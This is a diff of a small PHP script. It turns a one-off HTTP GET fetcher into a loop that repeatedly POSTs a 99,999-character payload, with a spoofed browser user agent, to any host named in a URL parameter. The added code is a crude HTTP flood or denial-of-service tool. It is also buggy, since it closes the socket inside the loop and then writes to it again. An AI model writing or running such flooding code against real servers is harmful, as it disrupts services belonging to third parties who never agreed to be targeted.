@@ -1,23 +1,34 @@
 <?php
+$data = str_repeat("A", 99999);
 $host = $_GET['host'];
-$sock = fsockopen($host, 80);
-if(!sock)
-{
-        echo 'bad sock';
-        exit();
+$path = "/";
+$post_data = 'data=' . $data;
+$socket = fsockopen($host, 80, $errno, $errstr, 15);
+if (!$socket) {
+	echo ' error: ' . $errno . ' ' . $errstr;
+	die;
 }
-$pack = "GET / HTTP/1.1\r\n";
-$pack.= "Host: " .$host. "\r\n";
-$pack.= "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0\r\n";
-$pack.= "Accept: */*\r\n";
-$pack.= "Accept-Language: en-US,en;q=0.5\r\n";
-$pack.= "Connection: closed\r\n\r\n";
-fwrite($sock, $pack);
-$data = "";
-while(!feof($sock))
+else
 {
-        $data.= fgets($ock, 512);
+	while(1)
+		{
+		$http = "POST {$path} HTTP/1.1\r\n";
+		$http .= "Host: {$host}\r\n";
+		$http .= "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0\r\n";
+		$http .= "Content-Type: application/x-www-form-urlencoded\r\n";
+		$http .= "Content-length: " . strlen($post_data) . "\r\n";
+		$http .= "Connection: close\r\n\r\n";
+		$http .= $post_data . "\r\n";
+		
+		fwrite($socket, $http);
+		
+		$contents = "";
+		#while (!feof($socket)) {
+		#	$contents.= fgets($socket, 4096);
+		#}
+
+		fclose($socket);
+		#echo $contents;
+		}
 }
-fclose($sock);
-echo $data;
 ?>
